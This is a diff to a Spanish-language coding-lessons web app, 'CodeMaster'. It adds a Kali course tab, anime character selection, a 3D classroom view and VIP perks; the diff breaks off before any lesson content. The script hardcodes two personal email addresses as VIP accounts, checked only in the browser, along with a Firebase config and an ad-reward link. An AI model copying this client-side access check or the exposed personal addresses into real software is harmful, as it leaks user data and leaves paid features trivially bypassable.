@@ -14,6 +14,12 @@
 body{background:#0a0e1a;color:#fff;display:flex;height:100vh;overflow:hidden;position:relative}
 body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 20% 10%,rgba(28,176,246,.15),transparent 50%),radial-gradient(circle at 80% 90%,rgba(233,69,96,.12),transparent 50%),radial-gradient(circle at 50% 50%,#141a2e,#0a0e1a);z-index:0}
 #canvas3d{position:fixed;inset:0;z-index:150;pointer-events:none}
+#salon-view{position:fixed;inset:0;z-index:190;background:#000;display:none}
+#salon-view.active{display:block}
+#salon-canvas{position:absolute;inset:0;width:100%;height:100%}
+.salon-controls{position:absolute;bottom:20px;left:50%;transform:translateX(-50%);display:flex;gap:8px;z-index:5;flex-wrap:wrap;justify-content:center}
+.salon-controls button{background:linear-gradient(135deg,#1cb0f6,#0d7bc4);color:#fff;border:none;padding:11px 16px;border-radius:12px;font-weight:800;cursor:pointer;font-size:12px}
+.salon-close{position:absolute;top:20px;right:20px;z-index:5;background:rgba(233,69,96,.9);color:#fff;border:none;width:48px;height:48px;border-radius:50%;font-size:22px;font-weight:bold;cursor:pointer}
 #aqua-handle{position:fixed;width:130px;height:200px;bottom:100px;right:20px;z-index:151;cursor:grab;pointer-events:auto;touch-action:none;border-radius:50%;border:2px dashed transparent}
 #aqua-handle.grabbing{border-color:#1cb0f6;background:rgba(28,176,246,.1)}
 #aqua-handle::before{content:'';position:absolute;inset:0;border-radius:50%;background:radial-gradient(circle,rgba(28,176,246,.35),transparent 70%);animation:pulseAura 3s infinite ease-in-out;pointer-events:none}
@@ -26,19 +32,20 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
 #btn-login{width:100%;max-width:320px;padding:15px;border-radius:12px;border:none;background:linear-gradient(180deg,#1cb0f6,#0d8ddb);color:#fff;font-weight:800;font-size:15px;cursor:pointer;border-bottom:4px solid #0a6ea8}
 #btn-register{width:100%;max-width:320px;padding:15px;border-radius:12px;border:2px solid #1cb0f6;background:transparent;color:#1cb0f6;font-weight:800;font-size:15px;cursor:pointer}
 #auth-error{color:#e94560;font-size:13px;text-align:center;max-width:320px;min-height:20px}
-.user-bar{position:fixed;top:0;left:0;right:0;z-index:200;background:rgba(10,14,26,.95);backdrop-filter:blur(15px);border-bottom:1px solid rgba(28,176,246,.3);padding:10px 15px;display:flex;justify-content:space-between;align-items:center;gap:8px}
-.user-bar .email{font-size:11px;color:#8b95a5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:50%;display:flex;align-items:center;gap:6px}
+.user-bar{position:fixed;top:0;left:0;right:0;z-index:200;background:rgba(10,14,26,.95);backdrop-filter:blur(15px);border-bottom:1px solid rgba(28,176,246,.3);padding:10px 15px;display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap}
+.user-bar .email{font-size:11px;color:#8b95a5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:45%;display:flex;align-items:center;gap:6px}
 .user-bar .email::before{content:'👤';font-size:14px}
 .user-bar .right-side{display:flex;gap:6px;align-items:center}
-.vip-badge{background:linear-gradient(135deg,#f39c12,#c87f0a);color:#fff;padding:4px 10px;border-radius:8px;font-size:10px;font-weight:800;letter-spacing:.5px}
+.vip-badge{background:linear-gradient(135deg,#f39c12,#c87f0a);color:#fff;padding:4px 10px;border-radius:8px;font-size:10px;font-weight:800}
 .logout-btn{background:linear-gradient(135deg,#e94560,#a82842);color:#fff;border:none;padding:8px 14px;border-radius:10px;font-size:11px;font-weight:800;cursor:pointer}
-.main-content{flex:1;display:flex;flex-direction:column;align-items:center;padding:15px;padding-top:70px;overflow-y:auto;position:relative;z-index:5;padding-bottom:200px;pointer-events:auto}
-.course-tabs{display:flex;width:100%;max-width:500px;gap:8px;margin-bottom:12px;background:rgba(22,33,62,.6);padding:6px;border-radius:16px;border:1px solid rgba(255,255,255,.06)}
-.course-tab{flex:1;padding:11px 4px;border-radius:12px;border:none;background:transparent;color:#8b95a5;font-weight:600;cursor:pointer;text-align:center;font-size:11px}
+.main-content{flex:1;display:flex;flex-direction:column;align-items:center;padding:15px;padding-top:70px;overflow-y:auto;position:relative;z-index:5;padding-bottom:220px;pointer-events:auto}
+.course-tabs{display:flex;width:100%;max-width:520px;gap:6px;margin-bottom:12px;background:rgba(22,33,62,.6);padding:6px;border-radius:16px;border:1px solid rgba(255,255,255,.06);overflow-x:auto}
+.course-tab{flex:1;min-width:70px;padding:10px 4px;border-radius:12px;border:none;background:transparent;color:#8b95a5;font-weight:600;cursor:pointer;text-align:center;font-size:10px;white-space:nowrap}
 .course-tab.active-python{background:linear-gradient(135deg,#58cc02,#46a302);color:#fff}
 .course-tab.active-hacking{background:linear-gradient(135deg,#e94560,#c92a44);color:#fff}
 .course-tab.active-termux{background:linear-gradient(135deg,#00d4aa,#00a88a);color:#fff}
-.stats{width:100%;max-width:500px;display:grid;grid-template-columns:repeat(5,1fr);gap:5px;margin-bottom:12px}
+.course-tab.active-kali{background:linear-gradient(135deg,#7b4dff,#5a2bd6);color:#fff}
+.stats{width:100%;max-width:520px;display:grid;grid-template-columns:repeat(5,1fr);gap:5px;margin-bottom:12px}
 .stat-card{background:rgba(22,33,62,.7);padding:8px 4px;border-radius:12px;border:1px solid rgba(255,255,255,.08);text-align:center;cursor:pointer}
 .stat-label{font-size:7px;color:#8b95a5;letter-spacing:.5px;text-transform:uppercase;font-weight:700}
 .stat-value{font-size:15px;font-weight:800;background:linear-gradient(135deg,#1cb0f6,#00d4ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
@@ -46,23 +53,26 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
 .stat-value.energy{background:linear-gradient(135deg,#f39c12,#ffd700);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 .stat-value.energy-inf{background:linear-gradient(135deg,#f39c12,#ffd700,#f39c12);-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:shine 2s infinite}
 @keyframes shine{0%,100%{opacity:1}50%{opacity:.7}}
-.action-buttons{width:100%;max-width:500px;display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
-.action-btn{flex:1;min-width:100px;padding:11px;border-radius:12px;border:none;font-weight:800;font-size:11px;cursor:pointer}
+.action-buttons{width:100%;max-width:520px;display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap}
+.action-btn{flex:1;min-width:75px;padding:10px 6px;border-radius:12px;border:none;font-weight:800;font-size:10px;cursor:pointer}
 .btn-review{background:linear-gradient(135deg,#533483,#3a1e5c);color:#fff}
 .btn-achievements{background:linear-gradient(135deg,#f39c12,#c87f0a);color:#fff}
 .btn-energy{background:linear-gradient(135deg,#00d4aa,#008f70);color:#fff}
 .btn-vip{background:linear-gradient(135deg,#f39c12,#c87f0a,#f39c12);color:#fff;background-size:200% 100%;animation:shine 3s infinite}
+.btn-waifus{background:linear-gradient(135deg,#e94560,#a82842);color:#fff}
+.btn-salon{background:linear-gradient(135deg,#7b4dff,#5a2bd6);color:#fff}
 .path-container{display:flex;flex-direction:column;align-items:center;gap:22px;margin-top:10px;width:100%;max-width:400px}
-.node{width:76px;height:76px;border-radius:50%;display:flex;flex-direction:column;justify-content:center;align-items:center;font-size:20px;font-weight:800;cursor:pointer;position:relative;transition:all .25s;border:3px solid rgba(255,255,255,.08)}
+.node{width:76px;height:76px;border-radius:50%;display:flex;flex-direction:column;justify-content:center;align-items:center;font-size:18px;font-weight:800;cursor:pointer;position:relative;transition:all .25s;border:3px solid rgba(255,255,255,.08)}
 .node:nth-child(odd){transform:translateX(-50px)}
 .node:nth-child(even){transform:translateX(50px)}
 .node.completed{background:linear-gradient(135deg,#e94560,#a82842);color:#fff;box-shadow:0 8px 0 #5f1725}
 .node.active{background:linear-gradient(135deg,#58cc02,#3a8f01);color:#fff;box-shadow:0 8px 0 #1f5201,0 0 30px rgba(88,204,2,.7);animation:bobbleOdd 1.8s infinite}
 .node.active-hacking{background:linear-gradient(135deg,#e94560,#a82842);box-shadow:0 8px 0 #5f1725}
 .node.active-termux{background:linear-gradient(135deg,#00d4aa,#008f70);box-shadow:0 8px 0 #004d3c}
+.node.active-kali{background:linear-gradient(135deg,#7b4dff,#5a2bd6);box-shadow:0 8px 0 #3a1a99}
 .node.locked{background:linear-gradient(135deg,#1e2841,#131c2e);color:#4a5668;cursor:not-allowed}
-.node .node-num{font-size:18px;line-height:1}
-.node .node-mini{font-size:7px;opacity:.75;margin-top:2px;font-weight:600;text-align:center;padding:0 3px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:70px}
+.node .node-num{font-size:16px;line-height:1}
+.node .node-mini{font-size:6px;opacity:.75;margin-top:2px;font-weight:600;text-align:center;padding:0 3px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:70px}
 @keyframes bobbleOdd{0%,100%{transform:scale(1) translateX(-50px)}50%{transform:scale(1.07) translateX(-50px)}}
 #aqua-bubble{position:fixed;bottom:55%;right:15px;width:230px;background:linear-gradient(135deg,#1cb0f6,#0d7bc4);color:#fff;padding:15px 18px;border-radius:20px;font-size:13px;font-weight:600;line-height:1.45;z-index:160;box-shadow:0 10px 30px rgba(28,176,246,.45);opacity:0;transform:translateY(15px);transition:all .35s;pointer-events:none;border:1px solid rgba(255,255,255,.15)}
 #aqua-bubble.show{opacity:1;transform:translateY(0)}
@@ -72,18 +82,18 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
 .close-btn{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.1);color:#fff;font-size:18px;cursor:pointer;font-weight:bold;width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center}
 .lesson-progress-bg{flex:1;height:14px;background:rgba(0,0,0,.4);border-radius:10px;overflow:hidden}
 .lesson-progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#58cc02,#89e219);border-radius:10px;transition:width .5s}
-.lesson-counter{color:#8b95a5;font-size:11px;font-weight:700;min-width:55px;text-align:right}
-.lesson-content{flex:1;display:flex;flex-direction:column;gap:15px;width:100%;max-width:640px;margin:0 auto;padding-bottom:200px;padding-left:110px}
-.lesson-card{background:linear-gradient(160deg,rgba(22,33,62,.96),rgba(15,22,42,.96));border-radius:22px;padding:20px;border:1px solid rgba(255,255,255,.1);box-shadow:0 20px 40px rgba(0,0,0,.6)}
-.lesson-title{color:#1cb0f6;font-size:14px;font-weight:800;text-align:center;letter-spacing:1px;text-transform:uppercase;padding-bottom:10px;border-bottom:1px solid rgba(28,176,246,.2);margin-bottom:12px}
-.step-title{color:#58cc02;font-size:14px;font-weight:800;margin-bottom:8px;padding-left:8px;border-left:3px solid #58cc02}
-.step-text{color:#c8d1de;font-size:13.5px;line-height:1.75;margin-bottom:14px}
-.step-text code{background:rgba(0,0,0,.5);color:#58cc02;padding:2px 6px;border-radius:5px;font-family:'Courier New',monospace;font-size:12px}
-.step-text pre{background:#050810;color:#89e219;padding:12px;border-radius:10px;font-family:'Courier New',monospace;font-size:11.5px;overflow-x:auto;margin:8px 0;border-left:3px solid #58cc02;line-height:1.6}
-.lesson-btn{background:linear-gradient(180deg,#1cb0f6,#0d8ddb);color:#fff;border:none;border-bottom:5px solid #0a6ea8;padding:14px;border-radius:14px;font-size:14px;font-weight:800;cursor:pointer;width:100%;text-transform:uppercase;margin-top:10px}
+.lesson-counter{color:#8b95a5;font-size:11px;font-weight:700;min-width:65px;text-align:right}
+.lesson-content{flex:1;display:flex;flex-direction:column;gap:15px;width:100%;max-width:640px;margin:0 auto;padding-bottom:200px;padding-left:100px}
+.lesson-card{background:linear-gradient(160deg,rgba(22,33,62,.96),rgba(15,22,42,.96));border-radius:22px;padding:18px;border:1px solid rgba(255,255,255,.1);box-shadow:0 20px 40px rgba(0,0,0,.6)}
+.lesson-title{color:#1cb0f6;font-size:13px;font-weight:800;text-align:center;letter-spacing:1px;text-transform:uppercase;padding-bottom:10px;border-bottom:1px solid rgba(28,176,246,.2);margin-bottom:12px}
+.step-title{color:#58cc02;font-size:13px;font-weight:800;margin-bottom:8px;padding-left:8px;border-left:3px solid #58cc02}
+.step-text{color:#c8d1de;font-size:13px;line-height:1.7;margin-bottom:12px}
+.step-text code{background:rgba(0,0,0,.5);color:#58cc02;padding:2px 6px;border-radius:5px;font-family:'Courier New',monospace;font-size:11.5px}
+.step-text pre{background:#050810;color:#89e219;padding:11px;border-radius:10px;font-family:'Courier New',monospace;font-size:11px;overflow-x:auto;margin:8px 0;border-left:3px solid #58cc02;line-height:1.5}
+.lesson-btn{background:linear-gradient(180deg,#1cb0f6,#0d8ddb);color:#fff;border:none;border-bottom:5px solid #0a6ea8;padding:13px;border-radius:14px;font-size:13px;font-weight:800;cursor:pointer;width:100%;text-transform:uppercase;margin-top:10px}
 .lesson-btn:active{transform:translateY(3px);border-bottom-width:2px}
-.quiz-question{color:#fff;font-size:15px;font-weight:700;line-height:1.5;margin-bottom:12px}
-.quiz-option{background:rgba(30,42,50,.9);color:#fff;border:2px solid #37464f;padding:13px;border-radius:12px;text-align:left;cursor:pointer;margin-bottom:8px;font-size:13px;font-weight:600;width:100%}
+.quiz-question{color:#fff;font-size:14px;font-weight:700;line-height:1.5;margin-bottom:12px}
+.quiz-option{background:rgba(30,42,50,.9);color:#fff;border:2px solid #37464f;padding:12px;border-radius:12px;text-align:left;cursor:pointer;margin-bottom:8px;font-size:13px;font-weight:600;width:100%}
 .quiz-option.correct{background:linear-gradient(135deg,#4e9f3d,#3a8f01);border-color:#58cc02}
 .quiz-option.wrong{background:linear-gradient(135deg,#d32f2f,#a82842);border-color:#e94560}
 .quiz-option:disabled{cursor:not-allowed}
@@ -110,8 +120,17 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
 .vip-benefit .icon{font-size:32px;flex-shrink:0}
 .vip-benefit h4{color:#f39c12;font-size:14px;font-weight:800;margin-bottom:4px}
 .vip-benefit p{color:#c8d1de;font-size:12px;line-height:1.4}
-.vip-cta{width:100%;padding:16px;border-radius:14px;border:none;background:linear-gradient(180deg,#f39c12,#c87f0a);color:#fff;font-weight:900;font-size:15px;cursor:pointer;border-bottom:5px solid #8b5a00;letter-spacing:1px;text-transform:uppercase;margin-top:15px}
-.vip-cta:active{transform:translateY(3px);border-bottom-width:2px}
+.waifu-card{display:flex;gap:12px;padding:12px;background:rgba(0,0,0,.3);border-radius:14px;margin-bottom:10px;border:2px solid transparent;cursor:pointer;transition:all .2s}
+.waifu-card.selected{border-color:#1cb0f6;background:rgba(28,176,246,.15)}
+.waifu-card .avatar{width:60px;height:60px;border-radius:50%;background:linear-gradient(135deg,#1cb0f6,#0d7bc4);display:flex;align-items:center;justify-content:center;font-size:26px;flex-shrink:0}
+.waifu-card .info{flex:1}
+.waifu-card h4{color:#fff;font-size:14px;margin-bottom:4px}
+.waifu-card p{color:#8b95a5;font-size:11px}
+.waifu-card .check{color:#1cb0f6;font-size:20px;align-self:center}
+.size-control{display:flex;align-items:center;gap:10px;background:rgba(0,0,0,.3);padding:12px;border-radius:14px;margin:10px 0}
+.size-control button{width:40px;height:40px;border-radius:50%;border:none;background:linear-gradient(135deg,#1cb0f6,#0d7bc4);color:#fff;font-size:20px;font-weight:bold;cursor:pointer}
+.size-control input[type=range]{flex:1}
+.size-control .val{color:#1cb0f6;font-weight:800;min-width:40px;text-align:center}
 .toast{position:fixed;top:70px;left:50%;transform:translateX(-50%) translateY(-150px);background:linear-gradient(135deg,#f39c12,#c87f0a);color:#fff;padding:14px 22px;border-radius:15px;font-weight:800;font-size:14px;z-index:1000;box-shadow:0 10px 30px rgba(243,156,18,.5);transition:transform .4s;pointer-events:none;max-width:90%;text-align:center}
 .toast.show{transform:translateX(-50%) translateY(0)}
 #welcome-overlay{position:fixed;inset:0;background:linear-gradient(160deg,#0a0e1a,#141a2e);z-index:99998;display:none;flex-direction:column;justify-content:center;align-items:center;padding:25px;overflow-y:auto}
@@ -120,13 +139,11 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
 .welcome-logo{font-size:42px;font-weight:900;background:linear-gradient(135deg,#1cb0f6,#00d4ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:3px}
 .welcome-sub{color:#8b95a5;font-size:14px}
 .welcome-card{background:linear-gradient(160deg,rgba(22,33,62,.9),rgba(15,22,42,.9));border-radius:20px;padding:18px;border:1px solid rgba(28,176,246,.3);text-align:left}
-.welcome-step{display:flex;gap:12px;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.05)}
-.welcome-step:last-child{border-bottom:none}
+.welcome-step{display:flex;gap:12px;padding:10px 0}
 .welcome-step .icon{font-size:26px;flex-shrink:0}
 .welcome-step .text{color:#c8d1de;font-size:13px;line-height:1.5}
 .welcome-step .text strong{color:#1cb0f6;display:block;margin-bottom:2px}
 .welcome-btn{width:100%;padding:16px;border-radius:14px;border:none;background:linear-gradient(180deg,#1cb0f6,#0d8ddb);color:#fff;font-weight:800;font-size:16px;cursor:pointer;border-bottom:5px solid #0a6ea8;letter-spacing:1px;text-transform:uppercase;margin-top:10px}
-.welcome-btn:active{transform:translateY(3px);border-bottom-width:2px}
 .welcome-progress{display:flex;gap:6px;justify-content:center;margin-bottom:10px}
 .welcome-dot{width:10px;height:10px;border-radius:50%;background:#2a3a52;transition:all .3s}
 .welcome-dot.active{background:#1cb0f6;width:28px;border-radius:5px}
@@ -135,67 +152,20 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
 <body>
 <canvas id="canvas3d"></canvas>
 <div id="aqua-handle"></div>
-
-<div id="welcome-overlay" style="display:none">
-<div class="welcome-container">
-<div class="welcome-progress" id="welcome-progress"></div>
-<div class="welcome-logo">CodeMaster</div>
-<p class="welcome-sub" id="welcome-sub">Tu aventura con Aqua comienza ahora</p>
-<div class="welcome-card" id="welcome-card"></div>
-<button class="welcome-btn" onclick="welcomeNext()">SIGUIENTE ➤</button>
-</div>
-</div>
-
-<div id="auth-overlay">
-<h1>CodeMaster</h1>
-<p class="sub">Aprende a programar con Aqua</p>
-<input id="email" type="email" placeholder="Correo electrónico">
-<input id="password" type="password" placeholder="Contraseña (mín. 6 caracteres)">
-<button id="btn-login" onclick="login()">INICIAR SESIÓN</button>
-<button id="btn-register" onclick="registrar()">CREAR CUENTA</button>
-<p id="auth-error"></p>
-</div>
-
-<div class="user-bar" id="user-bar" style="display:none">
-<span class="email" id="user-email">...</span>
-<div class="right-side">
-<span class="vip-badge" id="vip-badge" style="display:none">⭐ VIP</span>
-<button class="logout-btn" onclick="cerrarSesion()">SALIR</button>
-</div>
-</div>
-
-<div class="lesson-overlay" id="lesson-overlay">
-<div class="lesson-top-bar">
-<button class="close-btn" onclick="closeLesson()">✕</button>
-<div class="lesson-progress-bg"><div class="lesson-progress-fill" id="lesson-progress-fill"></div></div>
-<div class="lesson-counter" id="lesson-counter">0/40</div>
-</div>
-<div class="lesson-content" id="lesson-content"></div>
-</div>
-
-<div class="modal" id="modal-logros">
-<div class="modal-content">
-<div class="modal-title">🏆 Tus Logros</div>
-<div id="logros-list"></div>
-<button class="lesson-btn" onclick="cerrarLogros()" style="margin-top:15px">CERRAR</button>
-</div>
-</div>
-
-<div class="modal" id="modal-vip">
-<div class="modal-content vip-modal">
-<div class="modal-title gold">⭐ CodeMaster VIP</div>
-<p style="color:#c8d1de;font-size:13px;text-align:center;margin-bottom:15px">Desbloquea todo el potencial de la app</p>
-<div id="vip-benefits-list"></div>
-<div id="vip-status-area" style="margin-top:15px;text-align:center"></div>
-<button class="lesson-btn" onclick="cerrarVip()" style="margin-top:15px">CERRAR</button>
-</div>
-</div>
-
+<div id="salon-view"><canvas id="salon-canvas"></canvas><button class="salon-close" onclick="cerrarSalon()">✕</button><div class="salon-controls"><button onclick="rotarSalon(-1)">⟲</button><button onclick="rotarSalon(1)">⟳</button><button onclick="zoomSalon(0.1)">＋</button><button onclick="zoomSalon(-0.1)">−</button></div></div>
+<div id="welcome-overlay" style="display:none"><div class="welcome-container"><div class="welcome-progress" id="welcome-progress"></div><div class="welcome-logo">CodeMaster</div><p class="welcome-sub" id="welcome-sub">Tu aventura comienza</p><div class="welcome-card" id="welcome-card"></div><button class="welcome-btn" onclick="welcomeNext()">SIGUIENTE ➤</button></div></div>
+<div id="auth-overlay"><h1>CodeMaster</h1><p class="sub">Aprende con tus waifus</p><input id="email" type="email" placeholder="Correo"><input id="password" type="password" placeholder="Contraseña (6+)"><button id="btn-login" onclick="login()">INICIAR SESIÓN</button><button id="btn-register" onclick="registrar()">CREAR CUENTA</button><p id="auth-error"></p></div>
+<div class="user-bar" id="user-bar" style="display:none"><span class="email" id="user-email">...</span><div class="right-side"><span class="vip-badge" id="vip-badge" style="display:none">⭐ VIP</span><button class="logout-btn" onclick="cerrarSesion()">SALIR</button></div></div>
+<div class="lesson-overlay" id="lesson-overlay"><div class="lesson-top-bar"><button class="close-btn" onclick="closeLesson()">✕</button><div class="lesson-progress-bg"><div class="lesson-progress-fill" id="lesson-progress-fill"></div></div><div class="lesson-counter" id="lesson-counter">0/300</div></div><div class="lesson-content" id="lesson-content"></div></div>
+<div class="modal" id="modal-logros"><div class="modal-content"><div class="modal-title">🏆 Logros</div><div id="logros-list"></div><button class="lesson-btn" onclick="cerrarLogros()" style="margin-top:15px">CERRAR</button></div></div>
+<div class="modal" id="modal-vip"><div class="modal-content vip-modal"><div class="modal-title gold">⭐ VIP</div><div id="vip-benefits-list"></div><div id="vip-status-area" style="margin-top:15px;text-align:center"></div><button class="lesson-btn" onclick="cerrarVip()" style="margin-top:15px">CERRAR</button></div></div>
+<div class="modal" id="modal-waifus"><div class="modal-content"><div class="modal-title">👥 Elige tu Waifu</div><div id="waifus-list"></div><div class="size-control"><button onclick="cambiarTamano(-0.1)">−</button><input type="range" id="size-slider" min="0.5" max="3" step="0.1" value="1.3" oninput="cambiarTamano(this.value,true)"><button onclick="cambiarTamano(0.1)">＋</button><span class="val" id="size-val">1.3x</span></div><button class="lesson-btn" onclick="cerrarWaifus()" style="margin-top:10px">CERRAR</button></div></div>
 <div class="main-content">
 <div class="course-tabs">
 <button class="course-tab active-python" id="tab-python" onclick="switchCourse('python')">🐍 Python</button>
 <button class="course-tab" id="tab-hacking" onclick="switchCourse('hacking')">🛡️ Hacking</button>
 <button class="course-tab" id="tab-termux" onclick="switchCourse('termux')">💻 Termux</button>
+<button class="course-tab" id="tab-kali" onclick="switchCourse('kali')">🐉 Kali</button>
 </div>
 <div class="stats">
 <div class="stat-card" onclick="abrirLogros()"><div class="stat-label">Nivel</div><div class="stat-value" id="level">1</div></div>
@@ -206,377 +176,161 @@ body::before{content:'';position:fixed;inset:0;background:radial-gradient(circle
 </div>
 <div class="action-buttons">
 <button class="action-btn btn-review" onclick="repasarErrores()">🔁 Repasar (<span id="errores-count">0</span>)</button>
-<button class="action-btn btn-energy" id="btn-energy" onclick="conseguirEnergia()">⚡ +Energía</button>
+<button class="action-btn btn-energy" id="btn-energy" onclick="conseguirEnergia()">⚡ Ener</button>
+<button class="action-btn btn-waifus" onclick="abrirWaifus()">👥 Waifus</button>
+<button class="action-btn btn-salon" onclick="abrirSalon()">🏫 Salón</button>
 <button class="action-btn btn-vip" onclick="abrirVip()">⭐ VIP</button>
 </div>
 <div class="path-container" id="path-container"></div>
 </div>
-
 <div id="aqua-bubble"></div>
 <div class="toast" id="toast"></div>
 <div class="chat-fab" onclick="toggleChat()">💬</div>
 <div class="toggle-aqua" id="toggle-aqua" onclick="toggleAqua()">👁️</div>
-<div class="chat-input-bar" id="chat-input-bar">
-<input type="text" id="chat-input" placeholder="Escríbele a Aqua..." onkeypress="handleChatKey(event)">
-<button onclick="sendChat()">➤</button>
-</div>
+<div class="chat-input-bar" id="chat-input-bar"><input type="text" id="chat-input" placeholder="Escribe..." onkeypress="handleChatKey(event)"><button onclick="sendChat()">➤</button></div>
 
 <script>
 // ============================================
-// CONFIGURACIÓN
+// CONFIG
 // ============================================
 const firebaseConfig={apiKey:"AIzaSyCv9HVAlFaErjnncku9dFfcL1x664RCF9Q",authDomain:"aprende-97487.firebaseapp.com",projectId:"aprende-97487",storageBucket:"aprende-97487.firebasestorage.app",messagingSenderId:"678435140057",appId:"1:678435140057:web:97d9937c2cb2db330ca9c8"};
 firebase.initializeApp(firebaseConfig);
-const auth=firebase.auth();
-const db=firebase.firestore();
-
-// ⭐ CORREOS VIP (energía infinita)
+const auth=firebase.auth();const db=firebase.firestore();
 const VIP_EMAILS=['adrianbarrionuevo166@gmail.com','gio6play7@gmail.com'];
-
-// 📢 LINK DE ADSTERRA
 const ADSTERRA_URL='https://araplhn.org/4/5aa06f11efa9e1f76b5b57a1f141c10f';
-const ADSTERRA_TAPS_NEEDED=3;
-const ADSTERRA_REWARD=20;
+const ADSTERRA_TAPS_NEEDED=3,ADSTERRA_REWARD=20;
 
-// Beneficios VIP (solo texto por ahora)
+const WAIFUS=[
+{id:'aqua',name:'Aqua',model:'/static/aqua__anime_chibi_model.glb',voice:'xYrwTY3IRh6VBodoZUNN',desc:'Diosa del agua, dramática.',icon:'💧'},
+{id:'waifu3',name:'Waifu 3',model:'/static/waifu3.glb',voice:'flHkNRp1BlvT73UL6gyz',desc:'Misteriosa y elegante.',icon:'🌸'},
+{id:'waifu4',name:'Waifu 4',model:'/static/waifu4.glb',voice:'OSwaPSNdfituxkWcjlkR',desc:'Energética y alegre.',icon:'⚡'},
+{id:'waifu5',name:'Waifu 5',model:'/static/waifu5.glb',voice:'xYrwTY3IRh6VBodoZUNN',desc:'Tranquila y sabia.',icon:'🌙'},
+{id:'waifu6',name:'Waifu 6',model:'/static/waifu6.glb',voice:'flHkNRp1BlvT73UL6gyz',desc:'Fuerte y decidida.',icon:'🔥'}
+];
+
 const VIP_BENEFITS=[
-{icon:"⚡",title:"Energía Infinita",desc:"Nunca más esperes para hacer lecciones. Aprende sin límites."},
-{icon:"🎭",title:"Personajes Exclusivos",desc:"Desbloquea nuevas waifus con voces y personalidades únicas (próximamente)."},
-{icon:"🎨",title:"Temas Personalizados",desc:"Cambia los colores, fondos y estilos de toda la app (próximamente)."},
-{icon:"📚",title:"Lecciones Premium",desc:"Cursos avanzados de JavaScript, Rust, Ciberseguridad Ofensiva y más."},
-{icon:"🏆",title:"Logros VIP",desc:"Logros exclusivos que solo los miembros VIP pueden desbloquear."},
-{icon:"🚫",title:"Sin Anuncios",desc:"Disfruta de la app sin interrupciones ni publicidad."},
-{icon:"☁️",title:"Sincronización Prioritaria",desc:"Tus datos se guardan y sincronizan al instante en todos tus dispositivos."},
-{icon:"💬",title:"Chat Ilimitado con Aqua",desc:"Habla con Aqua sin límites y accede a respuestas más avanzadas."},
-{icon:"🎁",title:"Recompensas Diarias Dobles",desc:"Gana el doble de XP y energía cada día que entres."},
-{icon:"🚀",title:"Acceso Anticipado",desc:"Sé el primero en probar todas las nuevas funciones antes que nadie."}
+{icon:"⚡",title:"Energía Infinita",desc:"Aprende sin límites."},
+{icon:"🎭",title:"Todas las Waifus",desc:"Desbloquea todos los personajes."},
+{icon:"🏫",title:"Salón 3D",desc:"Accede al salón de clases."},
+{icon:"🎨",title:"Temas Personalizados",desc:"Cambia estilos de la app."},
+{icon:"📚",title:"Cursos Premium",desc:"Contenido avanzado."},
+{icon:"🏆",title:"Logros VIP",desc:"Logros exclusivos."},
+{icon:"🚫",title:"Sin Anuncios",desc:"Sin publicidad."},
+{icon:"🚀",title:"Acceso Anticipado",desc:"Prueba primero."}
 ];
 
 const LOGROS=[
-{id:'first',name:'Primer Paso',desc:'Completa tu primera lección',icon:'👶',check:()=>totalCompletadas()>=1},
+{id:'first',name:'Primer Paso',desc:'Completa 1 lección',icon:'👶',check:()=>totalCompletadas()>=1},
 {id:'five',name:'Estudiante',desc:'Completa 5 lecciones',icon:'📚',check:()=>totalCompletadas()>=5},
 {id:'twenty',name:'Dedicado',desc:'Completa 20 lecciones',icon:'🎓',check:()=>totalCompletadas()>=20},
 {id:'fifty',name:'Erudito',desc:'Completa 50 lecciones',icon:'🧠',check:()=>totalCompletadas()>=50},
 {id:'hundred',name:'Sabio',desc:'Completa 100 lecciones',icon:'🔮',check:()=>totalCompletadas()>=100},
-{id:'streak3',name:'Constante',desc:'Racha de 3 días',icon:'🔥',check:()=>streak>=3},
-{id:'streak7',name:'Imparable',desc:'Racha de 7 días',icon:'⚡',check:()=>streak>=7},
-{id:'level5',name:'Nivel 5',desc:'Alcanza el nivel 5',icon:'⭐',check:()=>level>=5},
-{id:'level10',name:'Nivel 10',desc:'Alcanza el nivel 10',icon:'🌟',check:()=>level>=10},
+{id:'twohundred',name:'Maestro',desc:'Completa 200 lecciones',icon:'🏅',check:()=>totalCompletadas()>=200},
+{id:'streak3',name:'Constante',desc:'Racha 3 días',icon:'🔥',check:()=>streak>=3},
+{id:'streak7',name:'Imparable',desc:'Racha 7 días',icon:'⚡',check:()=>streak>=7},
+{id:'level5',name:'Nivel 5',desc:'Alcanza nivel 5',icon:'⭐',check:()=>level>=5},
+{id:'level10',name:'Nivel 10',desc:'Alcanza nivel 10',icon:'🌟',check:()=>level>=10},
 {id:'xp500',name:'500 XP',desc:'Acumula 500 XP',icon:'💎',check:()=>xp>=500},
-{id:'vip',name:'Miembro VIP',desc:'Accede a CodeMaster VIP',icon:'👑',check:()=>isVip}
+{id:'waifu_change',name:'Coleccionista',desc:'Cambia de waifu',icon:'👥',check:()=>hasChangedWaifu},
+{id:'salon',name:'Visitante',desc:'Visita el salón',icon:'🏫',check:()=>hasVisitedSalon},
+{id:'vip',name:'VIP',desc:'Accede a VIP',icon:'👑',check:()=>isVip}
 ];
 
-const mk=(t,p,q,o,c)=>({t,p,q,o,c});
-
-// ==================== PYTHON (40) ====================
-const PY=[
